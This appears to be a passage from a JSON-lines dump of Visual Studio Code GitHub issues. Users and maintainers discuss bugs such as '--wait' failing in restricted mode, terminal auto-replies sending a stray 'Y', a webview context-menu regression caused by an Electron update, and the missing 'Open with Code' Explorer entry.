enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|31.58GB (16.17GB free)|\n|Process Argv|--crash-reporter-id 872a2680-ac63-4f87-b147-92ababbec63c|\n|Screen Reader|no|\n|VM|0%|\n\nConnection to 'ssh-remote+gklab-ssc-lrs03.igk.intel.com' could not be established\n\nConnection to 'ssh-remote+lrs03' could not be established\n\nConnection to 'ssh-remote+lrs03' could not be established\n</details><details><summary>Extensions (12)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\ngithub-markdown-preview|bie|0.3.0\nmarkdown-checkbox|bie|0.4.0\nmarkdown-emoji|bie|0.3.1\nmarkdown-footnotes|bie|0.1.1\nmarkdown-mermaid|bie|1.29.0\nmarkdown-preview-github-styles|bie|2.2.0\nmarkdown-yaml-preamble|bie|0.1.0\nremote-ssh|ms-|0.120.0\nremote-ssh-edit|ms-|0.87.0\nremote-explorer|ms-|0.5.0\nrust-analyzer|rus|0.3.2593\nvscode-lldb|vad|1.11.5\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nbinariesv615:30325510\nnativeloc1:31344060\ndwcopilot:31170013\ndwoutputs:31242946\ncopilot_t_ci:31333650\npythonrdcb7:31342333\nusemplatestapi:31297334\naj953862:31281341\n4f60g487:31327383\n63221493:31336333\ngendocstringf:31395206\ncloudbuttont:31379625\n42190218_ostrepl:31382710\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "under-discussion", "workbench-cli", "confirmed", "workspace-trust"], "comments": [{"author": "vs-code-engineering[bot]", "body": "Thanks for creating this issue! It looks like you may be using an old version of VS Code, the latest stable release is 1.104.2. Please try upgrading to the latest version and checking whether this issue remains.\n\nHappy Coding!"}, {"author": "aconradi", "body": "I have tried with the latest version of VSCode and with VSCode insiders and I can reproduce the issue there as well. "}, {"author": "bpasero", "body": "I cannot reproduce, is this involving a remote connection somehow?"}, {"author": "aconradi", "body": "No, this is locally on my Windows machine. It also happens with remote connections to a Linux machine. So for me whenever VSCode decides to open a new window to edit the new file the `--wait` breaks. I haven't been able to suss out why `code` sometimes opens the file in the existing window you run it from and sometimes opens the file in the same window. For me `C:\\temp\\some-file` always triggers the opening of a new window, but `../other-dir/some-file` does not trigger a new window.\n\nI can also reproduce this by starting a stand-alone Windows terminal running git-bash and running `code --wait /c/temp/some-file` from that terminal. VSCode then first selects some open VSCode window, tries to use it and then decides to create a new window and then the `code --wait` commands returns before I get a chance to edit the file.\n\nWhen I do this with VSCode Insider and an empty insider window already open I also get the, but then I first get a dialog that asks if I want to open the file in restricted mode or not, where I select to open it in restricted mode.\n\nIs there something more I can do to try to find why my VSCode behaves in this strange manner?\n"}, {"author": "bpasero", "body": "Let's see if any one else is seeing this issue to see if this is related to VS Code (i.e. can be fixed) or a setup problem with your system."}, {"author": "aconradi", "body": "I also tried this at home on my Mac and I run into the same problem there. When VSCode opens the new window for the file due to it being opened in restricted mode, the `code --wait` command returns immediately."}, {"author": "bpasero", "body": "@aconradi so this issue only occurs when restricted mode is also involved?"}, {"author": "aconradi", "body": "@bpasero Yes, I don't understand how restricted mode works, but I think that is true. The new window seems to always be in restricted mode."}, {"author": "bpasero", "body": "I can reproduce now, this needs quite a specific flow to trigger the issue:\n* you need to open a file that is in an untrusted folder\n* from the dialog you need to pick \"Open in Restricted Mode\"\n* this will force open a new window because the current one is restricted\n\n=> \ud83d\udc1b the `--wait` is not working in this case\n\n<img width=\"607\" height=\"385\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/301a37ab-9d98-4e11-a1eb-0eec8116fbc3\" />"}, {"author": "bpasero", "body": "This is actually very hard for us to implement because we have logic in this case that expects the editors to open in the current window and then track when the editor closes:\n\nhttps://github.com/microsoft/vscode/blob/0ff74c1fde922954585bc8619203ab8ebe6ade93/src/vs/workbench/electron-browser/window.ts#L1023-L1039\n\nAs part of the flow though, because of workspace trust, we open in a new window, which is something we only decide within that window, which is too late to track properly. \n\nI think the complexity of the fix does not warrant the effort here, the workaround is to trust the file so that it opens in the current window, given you explicitly stated the file path from the command line."}, {"author": "aconradi", "body": "Thanks for all the feedback! I now have a work-around for this. I had previously configured vscode to not trust all these external files, so I didn\u2019t get any prompt, things just failed silently. \n\nAnd I don\u2019t run this manually. My actual use-case is using jj and using code as the editor for commit messages. Jj puts the files for the commit messages in temp and not in the workspace.\n\nSo for now I have configured vscode to trust all files since I don\u2019t want this prompt every time I edit a commit message."}]}
{"repo": "microsoft/vscode", "issue_number": 142341, "issue_url": "https://github.com/microsoft/vscode/issues/142341", "issue_title": "Integrated terminal automatically sends 'Y' when terminating node batch script", "issue_author": "stephenmatheis", "issue_body": "Thank you so much for looking into this \ud83d\ude4f !\r\n\r\nIssue Type: <b>Bug</b>\r\n\r\n```console\r\n~ > npm run concurrently \\\"script-1.js\\\" \\\"script-2.js\\\"\r\n~ > [ type >> ctrl + c]\r\n~ > Terminate batch job (Y/N)? Y (this character is automatically sent, but only terminates first script, putting remaining output in prompt on next line)\r\n~ > [0] node script-name\r\n~ > [type >> enter]\r\n~ >                                                   y (character is still present, with spaces prepended)\r\n~ > y : The term 'y' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name,   \r\nor if a path was included, verify that the path is correct and try again.\r\nAt line:1 char:1\r\n```\r\n\r\n* The character <kbd>y</kbd> is never typed.\r\n* This does not happen in Windows Terminal. <kbd>ctrl</kbd> + <kbd>c</kbd> works as expected.\r\n\r\nVS Code version: Code 1.64.0 (5554b12acf27056905806867f251c859323ff7e9, 2022-02-03T04:22:20.678Z)\r\nOS version: Windows_NT x64 10.0.19044\r\nRestricted Mode: No\r\n\r\n<details>\r\n<summary>System Info</summary>\r\n\r\n|Item|Value|\r\n|---|---|\r\n|CPUs|AMD Ryzen 9 3900X 12-Core Processor             (24 x 3793)|\r\n|GPU Status|2d_canvas: enabled<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>oop_rasterization: enabled<br>opengl: enabled_on<br>rasterization: enabled<br>skia_renderer: enabled_on<br>video_decode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled|\r\n|Load (avg)|undefined|\r\n|Memory (System)|31.93GB (22.74GB free)|\r\n|Process Argv|C:\\\\Users\\\\steph\\\\OneDrive\\\\Documents\\\\GitHub\\\\robi --crash-reporter-id bc47a489-a287-44e8-9f71-a241e2b29255|\r\n|Screen Reader|no|\r\n|VM|0%|\r\n</details><details><summary>Extensions (10)</summary>\r\n\r\nExtension|Author (truncated)|Version\r\n---|---|---\r\nes6-string-css|bas|0.1.0\r\npython|ms-|2022.0.1786462952\r\nvscode-pylance|ms-|2022.2.0\r\njupyter|ms-|2022.1.1001775990\r\nremote-wsl|ms-|0.64.2\r\npowershell|ms-|2021.12.0\r\nLiveServer|rit|5.7.4\r\nes6-string-html|Tob|2.12.0\r\nvscode-todo-highlight|way|1.0.5\r\nes6-string-javascript|zjc|1.0.1\r\n\r\n\r\n</details><details>\r\n<summary>A/B Experiments</summary>\r\n\r\n```\r\nvsliv368cf:30146710\r\nvsreu685:30147344\r\npython383:30185418\r\nvspor879:30202332\r\nvspor708:30202333\r\nvspor363:30204092\r\npythonvspyl392cf:30425750\r\npythontb:30283811\r\npythonptprofiler:30281270\r\nvshan820:30294714\r\nvstes263cf:30335440\r\npythondataviewer:30285071\r\nvscod805:30301674\r\npythonvspyt200:30340761\r\nbinariesv615:30325510\r\nbridge0708:30335490\r\nbridge0723:30353136\r\nvsaa593cf:30376535\r\nvsc1dst:30433059\r\npythonvs932:30410667\r\nwslgetstartedc:30433508\r\nvscop940:30404999\r\nvsrem710:30416614\r\nvscop841:30430977\r\n\r\n```\r\n\r\n</details>\r\n\r\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "candidate", "windows", "terminal-conpty", "unreleased", "terminal-input"], "comments": [{"author": "meganrogge", "body": "You can fix this by setting the value of terminate hatch job within terminal.integrated.autoReplies to null "}, {"author": "stephenmatheis", "body": "@meganrogge, Thank you so much! I should have checked if this was a setting first. Just curious - is this a new setting/behavior? Just started happening with 1.64."}, {"author": "Snailedlt", "body": "This is still a bug.\r\n\r\nThis happens for me too. Every time I type `CTRL+C` it autoresponds `Y`. Now every time I type anything in the terminal after this, it writes Y after it: \r\n![image](https://user-images.githubusercontent.com/43886029/152754656-df8d0083-a428-4ad5-8791-4dac52a0d12a.png)\r\n```powershell\r\nY : The term 'Y' is not recognized as the name of a cmdlet, function, script file, or operable progr\r\nam. Check the spelling of the name, or if a path was included, verify that the path is correct and t \r\nry again.\r\nAt line:1 char:1\r\n+ Y\r\n+ ~\r\n    + CategoryInfo          : ObjectNotFound: (Y:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException\r\n```\r\nIf I type any command that gives a prompt, it stops autoresponding with `Y`. It also seems that writing git commands in the terminal somehow stops the `Y`autoresponse.\r\n\r\n\r\nEdit:\r\nLike like @meganrogge mentioned, adding\r\n ```json  \r\n\"terminal.integrated.autoReplies\": {\r\n    \"Terminate batch job (Y/N)\": null\r\n  }\r\n``` \r\nto settings.json will prevent this from happening. Note that this is just a workaround, since it does not fix the actual issue of `Y` being responded to any message, but rather disables the autoresponse alltogether"}, {"author": "Tyriar", "body": "I bet this is conpty reprinting causing duplicate responses \ud83e\udd26 "}, {"author": "Tyriar", "body": "Updating to Windows 11 might workaround this as I've never hit this issue. The theory is that something running in the terminal is triggering conpty (the backend component) to reprint the screen which would re-output the match text."}, {"author": "Tyriar", "body": "Thanks for the report, I'm going to disable it by default to be safe. We also had an idea for later on to allow the feature to be discovered intuitively when the user responds manually.\r\n\r\nHow to configure for the batch job message is now called out in the docs:\r\n\r\n![image](https://user-images.githubusercontent.com/2193314/152862499-049b261f-73a4-44c5-9d14-b2332a53fee7.png)\r\n"}, {"author": "filiptronicek", "body": "> meganrogge, Thank you so much! I should have checked if this was a setting first. Just curious - is this a new setting/behavior? Just started happening with 1.64.\r\n\r\nThis indeed is new with 1.64, see the [release notes](https://code.visualstudio.com/updates/v1_64#_automatic-replies) for details."}, {"author": "bballweiss", "body": "I'm trying to use this to automatically enter Y when terminating a batch job. It is giving me an error after my next command though, because it enters \"Y\" again. This is what I have in settings.json:\r\n![image](https://user-images.githubusercontent.com/26261118/153479033-99569eed-832d-4d13-b412-59f06b7cbe0d.png)\r\n\r\nAnd this is my terminal:\r\n![image](https://user-images.githubusercontent.com/26261118/153479411-4e84bfbe-1cc1-4709-a31a-80b6d272d14f.png)\r\n\r\nI saw Windows 11 was mentioned above. Do I need to be on that in order to use this feature?"}, {"author": "Tyriar", "body": "Yes on older versions of Windows this is less reliable as the terminal emulation provided by Windows ends up reprinting the screen, causing the phrase to show up again."}, {"author": "Snailedlt", "body": "Shouldn't this be fixed for Windows 10 too though? It's still supported by Microsoft and VSCode, right?"}, {"author": "Regenhardt", "body": "So is the conclusion just \"Not supported you gotta disable it on Windows 10 yourself\" and case closed? Doesn't seem right."}, {"author": "Regenhardt", "body": "Ok I see you disabled it by default in a merge request. So the state is now \"this isn't supported on Windows 10\"?\r\n\r\nHow about this:\r\n\r\nCurrently it seems to go \"if (buffer.Contains(trigger)) send(reply);\"  \r\nSo what if instead it goes \"if (buffer.Contains(trigger) && !buffer.Contains(trigger+reply)) send(reply);\"\r\n\r\nYou know, just check if the line that was found already has a reply?"}, {"author": "bballweiss", "body": "Thanks for the reply. I don't think it is OK to leave it as is. I saw it in the release notes (https://code.visualstudio.com/updates/v1_64#_automatic-replies) and spent way too much time trying to get it to work before finding this thread. Can it either be fixed to work with Windows 10 or update the docs to make it clear that Windows 11 is needed?"}]}
{"repo": "microsoft/vscode", "issue_number": 239862, "issue_url": "https://github.com/microsoft/vscode/issues/239862", "issue_title": "Native context menu hijacks custom one in webview editor", "issue_author": "dvdrtrgn", "issue_body": "\nType: <b>Bug</b>\n\nVS code january... \n\nOpen Git Graph and right-click an item. \n\nThe context menu shows only text operations.\n\n\nVS Code version: Code 1.97.0 (Universal) (33fc5a94a3f99ebe7087e8fe79fbe1d37a251016, 2025-02-04T22:41:26.688Z)\nOS version: Darwin arm64 23.6.0\nModes:\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|Apple M2 Pro (10 x 2400)|\n|GPU Status|2d_canvas: enabled<br>canvas_oop_rasterization: enabled_on<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|3, 3, 3|\n|Memory (System)|16.00GB (0.11GB free)|\n|Process Argv|--crash-reporter-id 0e8e2e6e-1b7c-420f-80bc-68c11cd9ef00|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (44)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nbetter-comments|aar|3.0.2\nBookmarks|ale|13.5.0\nproject-manager|ale|12.8.0\naws-toolkit-vscode|ama|3.45.0\nbrowse-lite|ant|0.3.9\ngoto-alias|ant|0.2.1\nvscode-apollo|apo|2.5.4\nlit-html|bie|1.11.1\nvscode-intelephense-client|bme|1.12.6\nvscode-tailwindcss|bra|0.14.3\npath-intellisense|chr|2.10.0\ncodestream|Cod|15.20.0\nvscode-eslint|dba|3.0.10\ngithistory|don|0.6.20\ngitlens|eam|16.2.2\nvscode-diff|fab|2.1.2\nmacros|ged|1.2.1\ngitlab-workflow|Git|5.38.0\ntodo-tree|Gru|0.0.226\nvscode-peacock|joh|4.2.2\nstring-manipulation|mar|0.7.25\ngit-graph|mhu|1.30.0\ndebugpy|ms-|2025.0.0\npython|ms-|2025.0.0\nvscode-pylance|ms-|2025.2.1\natom-keybindings|ms-|3.3.0\nvsliveshare|ms-|1.0.5948\nvscode-twoslash-queries|Ort|1.5.0\nadvanced-new-file|pat|1.2.2\nlaravel-jump-controller|pgl|0.0.33\npostman-for-vscode|Pos|1.7.0\nvscode-thunder-client|ran|2.34.0\nvscode-yaml|red|1.15.0\nLiveServer|rit|5.7.9\nopen-in-browser|tec|2.0.0\nes6-string-html|Tob|2.17.0\npdf|tom|1.2.2\nsort-lines|Tyr|1.12.0\nexplorer|vit|1.10.7\nvscode-icons|vsc|12.11.0\nvolar|Vue|2.2.0\nsnippet-generator|wen|0.3.8\npretty-ts-errors|Yoa|0.6.1\ntype-challenges|YRM|1.15.0\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368:30146709\nvspor879:30202332\nvspor708:30202333\nvspor363:30204092\nvscod805cf:30301675\nbinariesv615:30325510\nvsaa593:30376534\npy29gd2263:31024239\nc4g48928:30535728\nazure-dev_surveyone:30548225\n2i9eh265:30646982\n962ge761:30959799\npythonnoceb:30805159\npythonmypyd1:30879173\nh48ei257:31000450\npythontbext0:30879054\ncppperfnew:31000557\ndwnewjupyter:31046869\nnativerepl1:31139838\npythonrstrctxt:31112756\nnativeloc2:31192216\niacca1:31171482\n5fd0e150:31155592\ndwcopilot:31170013\nstablechunks:31184530\n6074i472:31201624\ncustomenabled:31232589\n8did9651:31230678\n9064b325:31222308\ncopilot_t_ci:31222730\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "candidate", "electron", "confirmed", "regression", "unreleased"], "comments": [{"author": "dminhhoang26", "body": "yes, im in the same issue"}, {"author": "gjsjohnmurray", "body": "Have you reported it to the extension author yet? "}, {"author": "barneyzhao", "body": "Same issue here.\n\nIt's [reported](https://github.com/mhutchie/vscode-git-graph/issues/869) to the extension author, but looks like they're not maintaining the project anymore.\n\nAccording to [@ammarsdc](https://github.com/mhutchie/vscode-git-graph/issues/869#issuecomment-2641775797), the extension context menu works in version 1.96.4"}, {"author": "cdpark0530", "body": "Same, thank you for the report"}, {"author": "bpasero", "body": "Bisect points to: https://github.com/microsoft/vscode/compare/151ef3514e76629f4e7bf3951439b1e0dae0a6e5...fca210cd103a496f25c23786b861a67f4d1ee16b\n\n@deepak1556 looks like the minor Electron update caused this.\n\nInstall https://marketplace.visualstudio.com/items?itemName=mhutchie.git-graph and click on the status bar entry.\n\n**Before:**\n\n<img width=\"502\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/040af248-651c-4eda-a0f7-a5f44739e0c7\" />\n\n**After:**\n\n<img width=\"399\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/7bdadd55-5894-4684-99bb-519bf5d7a27d\" />\n\nIt seems to me that \"before\" a custom menu from the webview opened and now a native menu. You can see the visual difference."}, {"author": "deepak1556", "body": "Issue seems to be from `contextmenu` event being fired twice on an element that messes up the state managed by this extension. It got regressed with https://github.com/electron/electron/pull/44954 due to missing return after the first dispatch.\n\nEdit: It has been addressed in https://github.com/electron/electron/pull/44978 which is available with `34.x.y`"}, {"author": "hoangnq3004", "body": "There is a temporary solution is right click on the left margin of the git-graph window, the context menu will appear\n\n<img width=\"690\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/1322a745-52e7-4a99-81e6-e767d88a416d\" />"}, {"author": "deepak1556", "body": "Fix backported in https://devdiv.visualstudio.com/DevDiv/_git/electron-build/commit/5ab0ea02f205badc9322c907bba193b9b7ae4751?refName=refs/heads/robo/hotfix/release_32_x_y"}, {"author": "reidsneo", "body": "No new vscode push update?\nthis is really annoying bug"}, {"author": "git-hub-tig", "body": "Solved with upgraded extension [Git Graph 3](https://marketplace.visualstudio.com/items?itemName=Gxl.git-graph-3&ssr=false#overview)"}, {"author": "mitjakukovec", "body": "> Solved with upgraded extension [Git Graph 3](https://marketplace.visualstudio.com/items?itemName=Gxl.git-graph-3&ssr=false#overview)\n\nIt's probably nothing serious, but I get this when trying to install\n\n<img width=\"516\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/e043de46-d96d-46e2-b67b-2a001fc35898\" />"}, {"author": "captain-corgi", "body": "Experienced the same"}, {"author": "git-hub-tig", "body": "> > Solved with upgraded extension [Git Graph 3](https://marketplace.visualstudio.com/items?itemName=Gxl.git-graph-3&ssr=false#overview)\n> \n> It's probably nothing serious, but I get this when trying to install\n> \n> <img alt=\"Image\" width=\"516\" src=\"https://private-user-images.githubusercontent.com/1738630/411648455-e043de46-d96d-46e2-b67b-2a001fc35898.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzkyNTEzMDcsIm5iZiI6MTczOTI1MTAwNywicGF0aCI6Ii8xNzM4NjMwLzQxMTY0ODQ1NS1lMDQzZGU0Ni1kOTZkLTQ2ZTItYjY3Yi0yYTAwMWZjMzU4OTgucG5nP1gtQW16LUFsZ29yaXRobT1BV1M0LUhNQUMtU0hBMjU2JlgtQW16LUNyZWRlbnRpYWw9QUtJQVZDT0RZTFNBNTNQUUs0WkElMkYyMDI1MDIxMSUyRnVzLWVhc3QtMSUyRnMzJTJGYXdzNF9yZXF1ZXN0JlgtQW16LURhdGU9MjAyNTAyMTFUMDUxNjQ3WiZYLUFtei1FeHBpcmVzPTMwMCZYLUFtei1TaWduYXR1cmU9Y2M3YmM1NTE3YTRjMzMyZjE3NTFhNDIxZDE4MjUwZmUyNWE0MjI0ZDZlNTk2ODNjNzdjYWRiM2U0MTczNWM3ZiZYLUFtei1TaWduZWRIZWFkZXJzPWhvc3QifQ.h086OX-KonnL-zdtBVraC6DqNjkLpDuVsPeAXt89iKg\">\n\nThanks for your feedback, publisher verification setting is undergoing."}, {"author": "PierreFaibrik", "body": "IMHO, I would be a bit careful installing a non-verified extension that has only approx 100 downloads, with a logo that looks pretty much GitGraph's one and that can access my code and all my files on my machine"}, {"author": "deepak1556", "body": "The issue has been addressed in today's insider https://code.visualstudio.com/insiders/ and will also be backported to the candidate release `1.97.2` later this week. I will lock this issue to avoid off-topic discussions"}, {"author": "deepak1556", "body": "Closing for verification.\n\n/closedWith https://github.com/microsoft/vscode/commit/39e41616659a1bba9d73114ea95072b2449729ea"}]}
{"repo": "microsoft/vscode", "issue_number": 257095, "issue_url": "https://github.com/microsoft/vscode/issues/257095", "issue_title": "When chat response contains diff marking, diff sounds play", "issue_author": "meganrogge", "issue_body": "From @jooyoungseo\n\nAccessibility.signals like `accessibility.signals.diffLineDeleted` are being used when they shouldn't be", "issue_labels": ["bug", "accessibility", "insiders-released"], "comments": [{"author": "meganrogge", "body": "@jooyoungseo can you pls provide reproducible steps? Not seeing this issue."}]}
{"repo": "microsoft/vscode", "issue_number": 258617, "issue_url": "https://github.com/microsoft/vscode/issues/258617", "issue_title": "Quicktree textbox should announce selected amount", "issue_author": "lramos15", "issue_body": "Testing #258361\n\n\n<img width=\"610\" height=\"297\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5e8076f1-247b-4c83-a3a2-26b29f374d00\" />\n\nIt doesn't announce 64 selected", "issue_labels": ["bug", "accessibility", "quick-pick", "insiders-released"], "comments": [{"author": "TylerLeonhardt", "body": "I'm not sure when I fixed this, but it does seem to announce now."}, {"author": "lramos15", "body": "<img width=\"685\" height=\"398\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/942edd01-0a44-4f43-9aa2-e4f89731cd35\" />\n\nI'm still not getting announcements here."}]}
{"repo": "microsoft/vscode", "issue_number": 260389, "issue_url": "https://github.com/microsoft/vscode/issues/260389", "issue_title": "\"Open with Code\" old context menu option missing from Explorer on version 1.103.0", "issue_author": "Z-d-Zen", "issue_body": "\nType: <b>Bug</b>\n\n1. Install Visual Studio Code version 1.103.0.\n2. During the installation, ensure the \"Add 'Open with Code' action to Windows Explorer directory context menu\" option is checked.\n3. Navigate to any folder in Windows Explorer and right-click on a sub-folder, or an empty space.\n\nVS Code version: Code 1.103.0 (e3550cfac4b63ca4eafca7b601f0d2885817fd1f, 2025-08-06T21:40:10.271Z)\nOS version: Windows_NT x64 10.0.26100\nModes:\n\n<img width=\"775\" height=\"571\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/4f1b931a-8e9e-495b-926f-bffb8c8c3dbf\" />\n\n<details>\n<summary>System Info</summary>\n\n|Item|Value|\n|---|---|\n|CPUs|AMD Ryzen 7 3750H with Radeon Vega Mobile Gfx   (8 x 2296)|\n|GPU Status|2d_canvas: enabled<br>direct_rendering_display_compositor: disabled_off_ok<br>gpu_compositing: enabled<br>multiple_raster_threads: enabled_on<br>opengl: enabled_on<br>rasterization: enabled<br>raw_draw: disabled_off_ok<br>skia_graphite: disabled_off<br>trees_in_viz: disabled_off<br>video_decode: enabled<br>video_encode: enabled<br>vulkan: disabled_off<br>webgl: enabled<br>webgl2: enabled<br>webgpu: enabled<br>webnn: disabled_off|\n|Load (avg)|undefined|\n|Memory (System)|13.94GB (5.36GB free)|\n|Process Argv|--crash-reporter-id 8058dcf6-bd5a-4eb6-81cd-935709363b9f|\n|Screen Reader|no|\n|VM|0%|\n</details><details><summary>Extensions (14)</summary>\n\nExtension|Author (truncated)|Version\n---|---|---\nvscode-eslint|dba|3.0.16\nprettier-vscode|esb|11.0.0\ncode-runner|for|0.12.2\nvscode-github-actions|git|0.27.2\nvsc-python-indent|Kev|1.21.0\ndebugpy|ms-|2025.10.0\npython|ms-|2025.10.1\nvscode-pylance|ms-|2025.7.1\nvscode-python-envs|ms-|1.2.0\njs-debug-nightly|ms-|2025.7.2917\nmaterial-icon-theme|PKi|5.25.0\nformat-html-in-php|rif|1.7.0\nLiveServer|rit|5.7.9\nvector-replace|tan|2.0.2\n\n\n</details><details>\n<summary>A/B Experiments</summary>\n\n```\nvsliv368cf:30146710\nbinariesv615:30325510\nh48ei257:31000450\nnativeloc1:31344060\ndwcopilot:31170013\n6074i472:31201624\ndwoutputs:31242946\ncopilot_t_ci:31333650\ne5gg6876:31282496\npythoneinst12:31285622\nc7cif404:31314491\n996jf627:31283433\npythonrdcb7:31342333\nusemplatestapi:31297334\n0aa6g176:31307128\n747dc170:31275177\naj953862:31281341\ngeneratesymbolt:31295002\nconvertfstringf:31295003\npylancequickfixf:31358881\n9d2cg352:31346308\nconvertlamdaf:31358879\nusemarketplace:31343026\nnesew2to5:31336538\nagentclaude:31350858\nreplacestringexc:31350595\nnes-set-on:31351930\n6abeh943:31336334\nyijiwantestdri0626-t:31336930\n0927b901:31350571\n4gdec884:31348710\n45650338:31358607\n0cj2b977:31352657\ngaj49834:31362110\n\n```\n\n</details>\n\n<!-- generated by issue reporter -->", "issue_labels": ["bug", "verified", "candidate", "windows", "regression", "unreleased"], "comments": [{"author": "BruceJillis", "body": "Same for me, installed VSCodeUserSetup-x64-1.102.2.exe and context menu item came back. installing VSCodeUserSetup-x64-1.103.0.exe makes it dissapear even though the settings where checked during the install"}, {"author": "OlivierPoitras", "body": "Same issue on my end, same version, happened right after update. More so, in Windows 11, if I search for VS Code in the Default Apps, it does not show up. Might help to debug, in the Apps search window, it shows VSCode as being a User version.\n\n<img width=\"791\" height=\"401\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/63a04644-f1b7-4d12-bc30-4439d59b1b23\" />"}, {"author": "rmhaiderali", "body": "+1"}, {"author": "Symmetrier", "body": "+1"}, {"author": "Pipur", "body": "+1"}, {"author": "davidchan9452", "body": "+1\nTime to disable VSCode auto update. Microsoft fxxked up everything, just like windows update."}, {"author": "joeyv120", "body": "> +1 Time to disable VSCode auto update. Microsoft fxxked up everything, just like windows update.\n\nThis, along with all the AI/chat/copilot \"features\" has me looking to roll back to an older version of VSCode and just leave it there."}, {"author": "Dev0nAJA99", "body": "Same here after a windows 10 update last night. I am on version 1.102.0 though."}, {"author": "davidchan9452", "body": "> > +1 Time to disable VSCode auto update. Microsoft fxxked up everything, just like windows update.\n> \n> This, along with all the AI/chat/copilot \"features\" has me looking to roll back to an older version of VSCode and just leave it there.\n\nI wish to roll back to Windows XP and Windows 7 lol. I miss those old days."}, {"author": "manimau01", "body": "Same here. The new update to Visual Studio Code version 1.103.0 removed the 'Open with Code' option from the context menu. Reinstalling with the options to add the context menu **checked**, still did not add it back. "}, {"author": "chuyuanliu", "body": "A workaround works for me is to install an earlier version first (say 1.102.3) with both \"Add Open with Code ...\" **checked**, and then run the 1.103 installer with both **unchecked**."}, {"author": "garretwilson", "body": "Same thing happened here. I turn around and there is no \"Open with Code\" option on Windows 10. (There is however an \"Open with Visual Studio\" option that does nothing. I wasn't even aware that I had Visual Studio installed.) I manually opened VS Code and it showed it had just updated to v1.103.0, which I infer is what removed the \"Open with Code\" option."}, {"author": "greenfox1505", "body": "+1"}, {"author": "deepak1556", "body": "This regressed via https://github.com/microsoft/vscode/commit/f5e06c148d8ffd4da18f37179d2be30348575124, its the old style context menu entry that was removed during postinstall https://github.com/microsoft/vscode/blob/88dc5d301c0be666dff294880c720d7cfc3595e1/build/win32/code.iss#L1537-L1545 since we never shipped the new context menu in stable."}, {"author": "CandyACE", "body": "+1"}, {"author": "deepak1556", "body": "/closedWith https://github.com/microsoft/vscode/commit/dbbe64c9e73acacf15cdc77fedc014712099b3d9\n\nClosing for verification."}, {"author": "deepak1556", "body": "**Steps for Verification**\n\nNote: This requires a stable build **not** insiders to verify\n\n* Install 1.102 with context menu option enabled in the setup\n* Verify that context menu `Open with Code` appears in the file explorer\n* Update to 1.103 and confirm that context menu is not present\n* Use `Developer: Apply Update` to update to the unreleased build of choice\n[system setup](https://vscode.download.prss.microsoft.com/dbazure/download/stable/dbbe64c9e73acacf15cdc77fedc014712099b3d9/VSCodeSetup-x64-1.103.0.exe)\n[user setup](https://vscode.download.prss.microsoft.com/dbazure/download/stable/dbbe64c9e73acacf15cdc77fedc014712099b3d9/VSCodeUserSetup-x64-1.103.0.exe)\n* Verify that context menu is now restored"}]}
{"repo": "microsoft/vscode", "issue_number": 262748, "issue_url": "https://github.com/microsoft/vscode/issues/262748", "issue_title": "NES + notebooks: Suggestions rendered below viewport", "issue_author": "bamurtaugh", "issue_body": "<!-- \u26a0\ufe0f\u26a0\ufe0f Do Not Delete This! feature_request_template \u26a0\ufe0f\u26a0\ufe0f -->\n<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->\n<!-- Please search existing issues to avoid creating duplicates. -->\n\n<!-- Describe the feature you'd like. -->\nWhen I got suggestions from NES that were outside my current viewport (i.e. some number of lines below in my current cell), I wasn't shown a downward arrow in the gutter that signaled to me there was an NES below. I just stumbled upon these edits by deciding to scroll myself.\n\nI'd expect a downward arrow, like we use in other text documents.", "issue_labels": ["bug", "notebook", "insiders-released", "NES"], "comments": [{"author": "DonJayamanne", "body": "I can repro this."}, {"author": "DonJayamanne", "body": "Unable to repro any more\nWorks now, will keep trying to repro the issue\nGiven this is standard functionality and no special casing for notebooks I am assuming there must have been some changes unrelated to this."}, {"author": "bamurtaugh", "body": "Looks like I am still able to reproduce. I changed the name of a variable in an early notebook cell, and the NES in notebooks does direct me to 1) later spots in the same cell, and 2) later cells across the notebook. \n\nBut in the final case shown at the end of this gif, I ran into the same issue of a suggestion being rendered outside the viewport: \n- I waited to see if I'd get NES\n- I didn't get a downward arrow, so I thought maybe no NES\n- When I scrolled down the notebook myself, I saw there was actually an NES that I wasn't notified about in my previous viewport\n\n![Image](https://github.com/user-attachments/assets/3458cfad-0945-4e73-8b54-b118ac350b27)"}, {"author": "bamurtaugh", "body": "This is the kind of 